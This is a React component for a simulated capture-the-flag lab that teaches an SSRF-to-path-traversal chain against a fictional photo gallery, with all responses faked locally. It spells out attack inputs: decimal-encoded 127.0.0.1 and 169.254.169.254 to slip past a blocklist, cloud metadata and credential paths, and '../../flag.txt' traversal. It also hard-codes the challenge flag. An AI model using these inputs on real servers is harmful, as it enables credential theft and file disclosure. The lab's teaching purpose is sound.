'use client';

import React, { useMemo, useRef, useState } from 'react';
import { Chip, Hint, LabButton, StageTracker, Term, TermLine, WinBanner } from './labUi';

/**
 * Simulated SSRF -> metadata -> LFI chain for the Songkran Photo Gallery
 * challenge. Nothing touches the network: a local function plays the role
 * of the vulnerable server so you can walk the exact exploit path.
 */

const FLAG = 'TCTT2026{songkran_splash_ssrf_to_lfi_chain}';

type Line = { tone: 'dim' | 'in' | 'ok' | 'bad' | 'flag' | 'plain'; text: string };

interface Effects {
  bypass?: boolean;
  metadata?: boolean;
  services?: boolean;
  consolePath?: boolean;
  consoleVisited?: boolean;
  flag?: boolean;
}

function dottedToDecimal(ip: string): number | null {
  const parts = ip.trim().split('.');
  if (parts.length !== 4) return null;
  let n = 0;
  for (const p of parts) {
    const v = Number(p);
    if (!Number.isInteger(v) || v < 0 || v > 255) return null;
    n = n * 256 + v;
  }
  return n;
}

// Parse a URL loosely so learners can type casually.
function parse(raw: string) {
  let s = raw.trim();
  s = s.replace(/^https?:\/\//i, '');
  const slash = s.indexOf('/');
  const authority = slash === -1 ? s : s.slice(0, slash);
  const rest = slash === -1 ? '' : s.slice(slash); // includes leading /
  const [host, portStr] = authority.split(':');
  const q = rest.indexOf('?');
  const path = q === -1 ? rest : rest.slice(0, q);
  const query = q === -1 ? '' : rest.slice(q + 1);
  return { host: host || '', port: portStr || '', path: path || '/', query };
}

function fileParam(query: string): string | null {
  if (!query) return null;
  for (const kv of query.split('&')) {
    const [k, ...v] = kv.split('=');
    if (k === 'file') return decodeURIComponent(v.join('='));
  }
  return null;
}

function simulate(raw: string): { lines: Line[]; effects: Effects } {
  const { host, port, path, query } = parse(raw);
  const L: Line[] = [];

  if (!host) {
    return { lines: [{ tone: 'bad', text: 'POST /api/import — empty url. Give me something to fetch.' }], effects: {} };
  }

  // Blocked dotted/known private spellings.
  if (['127.0.0.1', 'localhost', '[::1]', '169.254.169.254', '127.0.0.1.nip.io'].includes(host)) {
    return {
      lines: [
        { tone: 'in', text: `POST /api/import  url=http://${host}${port ? ':' + port : ''}${path}` },
        { tone: 'bad', text: '403  This link cannot be previewed. (private address blocked)' },
      ],
      effects: {},
    };
  }

  // Other obfuscations the real server rejected with 502.
  if (['0x7f000001', '0177.0.0.1', '0', '2130706433.0'].includes(host)) {
    return {
      lines: [
        { tone: 'in', text: `POST /api/import  url=http://${host}${path}` },
        { tone: 'bad', text: '502  Bad gateway. (the fetch library could not use this form)' },
      ],
      effects: {},
    };
  }

  // 127.0.0.1 written as one decimal integer -> slips past the blocklist.
  if (host === '2130706433') {
    // Internal ops console on :8082
    if (port === '8082') {
      if (path === '/' || path === '') {
        return {
          lines: [
            { tone: 'in', text: 'POST /api/import  url=http://2130706433:8082/' },
            { tone: 'bad', text: '404  <h1>404</h1> No such ops route.' },
            { tone: 'dim', text: '(note: this 404 text differs from the public app — a second, internal service lives here.)' },
          ],
          effects: { bypass: true },
        };
      }
      if (path === '/panel-b08a6498') {
        const fileV = fileParam(query);
        if (fileV === null) {
          return {
            lines: [
              { tone: 'in', text: 'POST /api/import  url=http://2130706433:8082/panel-b08a6498' },
              { tone: 'ok', text: '200  === Internal Ops Console ===  (Restricted access • Festival operations only)' },
              { tone: 'plain', text: '<form action="/panel-b08a6498/download" method="get">' },
              { tone: 'plain', text: '  <input name="file" placeholder="backup-2026.zip">' },
              { tone: 'dim', text: '<!-- Backups live in the uploads directory. -->' },
              { tone: 'dim', text: 'Try the download with a file= value. Can you climb out of uploads/ ?' },
            ],
            effects: { bypass: true, consoleVisited: true },
          };
        }
        // download?file=...
        const climbs = (fileV.match(/\.\.\//g) || []).length;
        if (fileV === 'backup-2026.zip') {
          return {
            lines: [
              { tone: 'in', text: 'url=http://2130706433:8082/panel-b08a6498/download?file=backup-2026.zip' },
              { tone: 'bad', text: '404  File not found.' },
            ],
            effects: { bypass: true, consoleVisited: true },
          };
        }
        if (fileV.includes('flag') && climbs >= 2) {
          return {
            lines: [
              { tone: 'in', text: `url=http://2130706433:8082/panel-b08a6498/download?file=${fileV}` },
              { tone: 'ok', text: '200  Content-Type: text/plain' },
              { tone: 'flag', text: FLAG },
            ],
            effects: { bypass: true, consoleVisited: true, flag: true },
          };
        }
        if (fileV.includes('flag') && climbs === 1) {
          return {
            lines: [
              { tone: 'in', text: `url=http://2130706433:8082/panel-b08a6498/download?file=${fileV}` },
              { tone: 'bad', text: '404  File not found. (one ../ lands in the parent — flag.txt is not there)' },
              { tone: 'dim', text: 'Climb one more level...' },
            ],
            effects: { bypass: true, consoleVisited: true },
          };
        }
        return {
          lines: [
            { tone: 'in', text: `url=http://2130706433:8082/panel-b08a6498/download?file=${fileV}` },
            { tone: 'bad', text: '404  File not found.' },
          ],
          effects: { bypass: true, consoleVisited: true },
        };
      }
      // some other :8082 path (brute forcing)
      return {
        lines: [
          { tone: 'in', text: `url=http://2130706433:8082${path}` },
          { tone: 'bad', text: '404  No such ops route. (the real route is a random token — guessing will not find it)' },
        ],
        effects: { bypass: true },
      };
    }

    // :80 / default — the public app homepage. SSRF + bypass confirmed.
    return {
      lines: [
        { tone: 'in', text: `POST /api/import  url=http://2130706433${path}` },
        { tone: 'ok', text: '200  <title>Songkran Photo Gallery</title> ... (the app homepage — from the INSIDE!)' },
        { tone: 'dim', text: '2130706433 == 127.0.0.1. The blocklist only knew the dotted spelling. You are on localhost now.' },
      ],
      effects: { bypass: true },
    };
  }

  // Cloud metadata service (169.254.169.254 as decimal).
  if (host === '2852039166') {
    const p = path.replace(/\/+$/, '/');
    if (p === '/latest/meta-data/' || p === '/') {
      return {
        lines: [
          { tone: 'in', text: 'url=http://2852039166/latest/meta-data/' },
          { tone: 'ok', text: '200  local-ipv4  hostname  instance-id  services/  security-credentials/' },
          { tone: 'dim', text: 'Walk into services/ — that is where the internal apps register.' },
        ],
        effects: { bypass: true, metadata: true },
      };
    }
    if (p.startsWith('/latest/meta-data/services/ops-console-legacy')) {
      return {
        lines: [
          { tone: 'in', text: 'url=http://2852039166/latest/meta-data/services/ops-console-legacy' },
          { tone: 'plain', text: '200  http://127.0.0.1:8082/legacy-panel' },
        ],
        effects: { bypass: true, metadata: true, services: true },
      };
    }
    if (p.startsWith('/latest/meta-data/services/ops-console')) {
      return {
        lines: [
          { tone: 'in', text: 'url=http://2852039166/latest/meta-data/services/ops-console' },
          { tone: 'ok', text: '200  http://127.0.0.1:8082/panel-b08a6498' },
          { tone: 'dim', text: 'There it is — the hidden console URL, with its random token. No brute force needed.' },
        ],
        effects: { bypass: true, metadata: true, services: true, consolePath: true },
      };
    }
    if (p.startsWith('/latest/meta-data/services')) {
      return {
        lines: [
          { tone: 'in', text: 'url=http://2852039166/latest/meta-data/services/' },
          { tone: 'ok', text: '200  ops-console   ops-console-legacy' },
          { tone: 'dim', text: 'Read services/ops-console to get its real URL.' },
        ],
        effects: { bypass: true, metadata: true, services: true },
      };
    }
    if (p.startsWith('/latest/meta-data/security-credentials')) {
      return {
        lines: [
          { tone: 'in', text: 'url=http://2852039166/latest/meta-data/security-credentials/' },
          { tone: 'plain', text: '200  { "AccessKeyId": "AKIAFFFFFFFFFFFFFF01",' },
          { tone: 'plain', text: '        "SecretAccessKey": "do-not-actually-use-this-it-is-a-ctf-joke" }' },
          { tone: 'dim', text: 'A decoy. The prize here is the service PATH, not these keys.' },
        ],
        effects: { bypass: true, metadata: true },
      };
    }
    return {
      lines: [
        { tone: 'in', text: `url=http://2852039166${path}` },
        { tone: 'bad', text: '404  Not found. (only a few metadata keys exist)' },
      ],
      effects: { bypass: true, metadata: true },
    };
  }

  // A harmless external URL — proves the fetch is real (SSRF primitive) but no bypass.
  return {
    lines: [
      { tone: 'in', text: `POST /api/import  url=http://${host}${path}` },
      { tone: 'ok', text: `200  (the server fetched ${host} for you — the SSRF primitive is live)` },
      { tone: 'dim', text: 'Now aim it INWARD at 127.0.0.1 — but the dotted form is blocked.' },
    ],
    effects: {},
  };
}

const STAGES = [
  'Confirm SSRF + bypass the blocklist',
  'Reach the cloud metadata service',
  'Find the hidden ops-console URL',
  'Read the flag with ../../',
];

export default function WebSsrfLab({ isDusk }: { isDusk: boolean }) {
  const [input, setInput] = useState('https://example.com/songkran.jpg');
  const [log, setLog] = useState<Line[]>([
    { tone: 'dim', text: 'The import form fetches any URL you give it (POST /api/import?url=...).' },
    { tone: 'dim', text: 'Goal: read flag.txt on the server. Start by proving the fetch is real.' },
  ]);
  const [eff, setEff] = useState<Required<Effects>>({
    bypass: false,
    metadata: false,
    services: false,
    consolePath: false,
    consoleVisited: false,
    flag: false,
  });
  const [convIn, setConvIn] = useState('127.0.0.1');
  const logRef = useRef<HTMLDivElement>(null);

  const current = useMemo(() => {
    if (eff.flag) return 4;
    if (eff.consolePath || eff.consoleVisited) return 3;
    if (eff.metadata) return 2;
    if (eff.bypass) return 1;
    return 0;
  }, [eff]);

  const run = (url?: string) => {
    const target = (url ?? input).trim();
    if (!target) return;
    if (url) setInput(url);
    const { lines, effects } = simulate(target);
    setLog((prev) => [...prev, { tone: 'dim', text: '────────────' }, ...lines]);
    setEff((prev) => ({
      bypass: prev.bypass || !!effects.bypass,
      metadata: prev.metadata || !!effects.metadata,
      services: prev.services || !!effects.services,
      consolePath: prev.consolePath || !!effects.consolePath,
      consoleVisited: prev.consoleVisited || !!effects.consoleVisited,
      flag: prev.flag || !!effects.flag,
    }));
    requestAnimationFrame(() => {
      logRef.current?.scrollTo({ top: logRef.current.scrollHeight, behavior: 'smooth' });
    });
  };

  const reset = () => {
    setLog([
      { tone: 'dim', text: 'Reset. The import form fetches any URL you give it.' },
    ]);
    setEff({ bypass: false, metadata: false, services: false, consolePath: false, consoleVisited: false, flag: false });
  };

  // Contextual suggestion chips (so you learn the path without typing long URLs).
  const chips: { label: string; url: string }[] = [];
  if (!eff.bypass) {
    chips.push({ label: 'http://127.0.0.1/', url: 'http://127.0.0.1/' });
    chips.push({ label: 'http://2130706433/', url: 'http://2130706433/' });
  } else if (!eff.metadata) {
    chips.push({ label: 'metadata root', url: 'http://2852039166/latest/meta-data/' });
    chips.push({ label: 'try 127.0.0.1 again', url: 'http://127.0.0.1/' });
  } else if (!eff.services) {
    chips.push({ label: 'meta-data/services/', url: 'http://2852039166/latest/meta-data/services/' });
    chips.push({ label: 'security-credentials/', url: 'http://2852039166/latest/meta-data/security-credentials/' });
  } else if (!eff.consolePath) {
    chips.push({ label: 'services/ops-console', url: 'http://2852039166/latest/meta-data/services/ops-console' });
  } else if (!eff.consoleVisited) {
    chips.push({ label: 'visit the panel', url: 'http://2130706433:8082/panel-b08a6498' });
  } else if (!eff.flag) {
    chips.push({ label: 'file=backup-2026.zip', url: 'http://2130706433:8082/panel-b08a6498/download?file=backup-2026.zip' });
    chips.push({ label: 'file=../flag.txt', url: 'http://2130706433:8082/panel-b08a6498/download?file=../flag.txt' });
    chips.push({ label: 'file=../../flag.txt', url: 'http://2130706433:8082/panel-b08a6498/download?file=../../flag.txt' });
  }

  const hint = !eff.bypass
    ? 'The dotted form 127.0.0.1 is blocked. Write the SAME address as one decimal integer. Use the converter below.'
    : !eff.metadata
    ? 'You are inside. Cloud VMs answer at 169.254.169.254 — convert it to decimal and fetch /latest/meta-data/.'
    : !eff.services
    ? 'The metadata lists services/. That is where internal apps register their real URLs.'
    : !eff.consolePath
    ? 'Read services/ops-console to get the panel\'s random URL — brute force never finds it.'
    : !eff.consoleVisited
    ? 'Visit the panel URL through the SSRF to see its file-download form.'
    : 'The download reads files by name from uploads/. Climb out with ../ until you reach flag.txt.';

  const decimal = dottedToDecimal(convIn);

  return (
    <div className="space-y-4">
      <StageTracker stages={STAGES} current={current} isDusk={isDusk} />

      {!eff.flag && <Hint isDusk={isDusk}>{hint}</Hint>}

      {/* Request builder */}
      <div
        className={`rounded-2xl p-3.5 border space-y-2.5 ${
          isDusk ? 'bg-[#2A263A] border-[#3E3852]' : 'bg-[#EDE8DF] border-[#D2C9B8]'
        }`}
      >
        <div className={`text-[11px] font-bold uppercase tracking-wider ${isDusk ? 'text-[#B9B2CE]' : 'text-[#5A544E]'}`}>
          The server will fetch this URL
        </div>
        <input
          value={input}
          onChange={(e) => setInput(e.target.value)}
          onKeyDown={(e) => {
            if (e.key === 'Enter') run();
          }}
          spellCheck={false}
          autoCapitalize="none"
          autoCorrect="off"
          className={`w-full rounded-xl px-3 py-2 font-mono text-xs border outline-none ${
            isDusk
              ? 'bg-[#12101a] text-[#d7d2e6] border-[#342F46] focus:border-rose-500/60'
              : 'bg-white text-[#2A2623] border-[#D2C9B8] focus:border-rose-400'
          }`}
        />
        <LabButton onClick={() => run()} tone="primary" isDusk={isDusk} full>
          ⚡ Fetch (as the server)
        </LabButton>

        {chips.length > 0 && (
          <div className="flex items-center gap-2 overflow-x-auto no-scrollbar pt-0.5">
            <span className={`text-[10px] shrink-0 ${isDusk ? 'text-[#6f6a85]' : 'text-[#9a9388]'}`}>try:</span>
            {chips.map((c) => (
              <Chip key={c.url} isDusk={isDusk} onClick={() => run(c.url)}>
                {c.label}
              </Chip>
            ))}
          </div>
        )}
      </div>

      {/* Decimal IP converter */}
      <div
        className={`rounded-2xl p-3.5 border ${
          isDusk ? 'bg-[#161320]/60 border-[#342F46]' : 'bg-[#EFECE6]/80 border-[#D2C9B8]'
        }`}
      >
        <div className={`text-[11px] font-bold mb-2 ${isDusk ? 'text-[#D4CDE4]' : 'text-[#443E38]'}`}>
          🧮 IP → decimal converter (your bypass tool)
        </div>
        <div className="flex items-center gap-2">
          <input
            value={convIn}
            onChange={(e) => setConvIn(e.target.value)}
            spellCheck={false}
            className={`flex-1 min-w-0 rounded-lg px-2.5 py-1.5 font-mono text-xs border outline-none ${
              isDusk ? 'bg-[#12101a] text-[#d7d2e6] border-[#342F46]' : 'bg-white text-[#2A2623] border-[#D2C9B8]'
            }`}
          />
          <span className={`text-xs font-mono ${isDusk ? 'text-[#6f6a85]' : 'text-[#9a9388]'}`}>=</span>
          <code
            className={`font-mono text-xs font-bold px-2 py-1 rounded-lg ${
              isDusk ? 'bg-[#2A263A] text-amber-300' : 'bg-[#E8CFC2] text-[#5C2E1B]'
            }`}
          >
            {decimal === null ? '—' : decimal}
          </code>
        </div>
        <div className="flex items-center gap-2 pt-2 overflow-x-auto no-scrollbar">
          {['127.0.0.1', '169.254.169.254'].map((ip) => (
            <Chip key={ip} isDusk={isDusk} onClick={() => setConvIn(ip)}>
              {ip}
            </Chip>
          ))}
        </div>
      </div>

      {/* Terminal log */}
      <Term className="max-h-80">
        <div ref={logRef} className="max-h-72 overflow-y-auto no-scrollbar">
          {log.map((l, i) => (
            <TermLine key={i} tone={l.tone}>
              {l.text}
            </TermLine>
          ))}
        </div>
      </Term>

      {eff.flag && <WinBanner flag={FLAG} isDusk={isDusk} />}

      <div className="flex justify-end">
        <LabButton onClick={reset} isDusk={isDusk}>
          ↺ Reset lab
        </LabButton>
      </div>
    </div>
  );
}
